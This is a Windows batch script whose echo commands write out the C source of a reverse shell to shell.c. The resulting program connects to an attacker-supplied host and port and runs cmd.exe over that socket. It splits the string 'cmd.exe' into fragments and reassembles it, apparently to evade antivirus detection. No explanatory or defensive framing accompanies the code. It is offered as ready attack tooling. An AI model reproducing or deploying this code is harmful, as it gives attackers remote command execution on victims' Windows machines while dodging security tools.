echo #include ^<winsock2.h^> >> shell.c
echo #include ^<stdio.h^> >> shell.c
echo #pragma comment(lib, "w2_32") >> shell.c
echo WSADATA wsaData; >> shell.c
echo SOCKET Winsock; >> shell.c
echo SOCKET Sock; >> shell.c
echo struct sockaddr_in hax; >> shell.c
echo char aip_addr[16]; >> shell.c
echo STARTUPINFO ini_processo; >> shell.c
echo PROCESS_INFORMATION processo_info; >> shell.c
echo int main(int argc, char *argv[]) >> shell.c
echo { >> shell.c
echo    WSAStartup(MAKEWORD(2,2), ^&wsaData); >> shell.c
echo    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL); >> shell.c
echo        if (argv[1] == NULL){ >> shell.c
echo        exit(1); >> shell.c
echo    } >> shell.c
echo        struct hostent *host; >> shell.c
echo    host = gethostbyname(argv[1]); >> shell.c
echo    strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr))); >> shell.c
echo    hax.sin_family = AF_INET; >> shell.c
echo    hax.sin_port = htons(atoi(argv[2])); >> shell.c
echo    hax.sin_addr.s_addr =inet_addr(aip_addr); >> shell.c
echo    WSAConnect(Winsock,(SOCKADDR*)^&hax, sizeof(hax),NULL,NULL,NULL,NULL); >> shell.c
echo    if (WSAGetLastError() == 0) { >> shell.c
echo        memset(^&ini_processo, 0, sizeof(ini_processo)); >> shell.c
echo        ini_processo.cb=sizeof(ini_processo); >> shell.c
echo        ini_processo.dwFlags=STARTF_USESTDHANDLES; >> shell.c
echo        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock; >> shell.c
echo        char *myArray[4] = { "cm", "d.e", "x", "e" }; >> shell.c
echo        char command[8] = ""; >> shell.c
echo        snprintf( command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]); >> shell.c
echo        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, ^&ini_processo, ^&processo_info); >> shell.c
echo        exit(0); >> shell.c
echo    } else { >> shell.c
echo        exit(0); >> shell.c
echo    } >> shell.c
echo } >> shell.c